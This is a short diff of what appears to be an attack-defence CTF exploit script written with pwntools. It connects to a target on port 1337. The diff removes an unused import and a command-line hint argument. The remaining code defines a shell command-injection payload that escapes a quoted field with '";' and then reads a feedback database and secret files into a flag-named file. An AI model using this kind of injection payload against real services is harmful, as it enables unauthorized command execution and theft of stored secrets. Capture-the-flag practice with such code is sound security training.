@@ -2,10 +2,8 @@
 
 import sys
 from pwn import *
-from string import ascii_letters, digits
 
 host = sys.argv[1]
-hint = sys.argv[2]
 
 r = remote(host, 1337)
 payload = '"; cat feedback/feedback-db.txt > /tmp/kek; cat secrets/* >> /tmp/kek; cat /tmp/kek > secrets/flags:flags; echo "pwned'
